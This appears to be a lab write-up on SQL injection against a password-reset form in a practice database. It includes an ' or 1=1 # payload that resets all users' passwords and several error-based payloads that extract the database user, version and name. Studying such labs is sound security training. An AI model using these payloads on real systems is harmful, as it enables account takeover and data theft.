Here we are greeted with a a form or a login page which asks us to insert the username and a new password that will be further changed in the database.

![](Aspose.Words.dbaad557-632d-4ae7-af4e-b217afd35eb7.001.png)

![](Aspose.Words.dbaad557-632d-4ae7-af4e-b217afd35eb7.001.png)

**PAYLOAD:** Username:admin

`	       `New Password:123456

As we know that admin is an entry in the database and is also a user we will proceed by using “admin” as our username and change or update our password to 123456.

![](Aspose.Words.dbaad557-632d-4ae7-af4e-b217afd35eb7.001.png)

**PAYLOAD:** use security;

`                   `select database();**   	
**
`                   `select \* from users where username="admin";    

Using the terminal we can also confirm whether the password for the user “admin” is changed, using mysql in the terminal.

![](Aspose.Words.dbaad557-632d-4ae7-af4e-b217afd35eb7.001.png)

Now no matter whatever character we use to break the query in the username field may it be ‘,”,’),”),/ etc we get the same message over and over again.

![](Aspose.Words.dbaad557-632d-4ae7-af4e-b217afd35eb7.001.png)

Here we input the username as admin (which is one of the registered users in the database) and try to break the query in the password field. Which ends up giving us an error message.

![](Aspose.Words.dbaad557-632d-4ae7-af4e-b217afd35eb7.001.png)

**PAYLOAD:** ' or 1=1 #

While we use the username as “admin” and the password as a sqli injection query we see that there is no error message that interrupts the webpage but the message pops up saying that the password is simply updated.

![](Aspose.Words.dbaad557-632d-4ae7-af4e-b217afd35eb7.001.png)

Here we see that the password of the user “admin has been changed to 1 and cont only admin but all the corresponding 14 entries have changed passwords now like so.

![](Aspose.Words.dbaad557-632d-4ae7-af4e-b217afd35eb7.001.png)

Now we have found a new injection point where all the entries have their passwords updated or set to “1”.

**PAYLOAD:**’ AND (select 1 from(select count(\*),(concat(“~”,select user()),”~”,floor(rand(0)\*2)))c from information\_schema.tables group by c)a) #

Using the above payload and inputting it as the password we will be able to retrieve the current user and by changing the ‘ AND (select 1 from(select count(\*),(concat(“~”,select user()),”~”,floor(rand(0)\*2)))c from information\_schema.tables group by c)a) # part of the database we will be able to retrieve or extract even more data like so.

Like for example: ‘ AND (select 1 from(select count(\*),(concat(“~”,select version()),”~”,floor(rand(0)\*2)))c from information\_schema.tables group by c)a) #

` `AND (select 1 from(select count(\*),(concat(“~”,select database()),”~”,floor(rand(0)\*2)))c from information\_schema.tables group by c)a) #




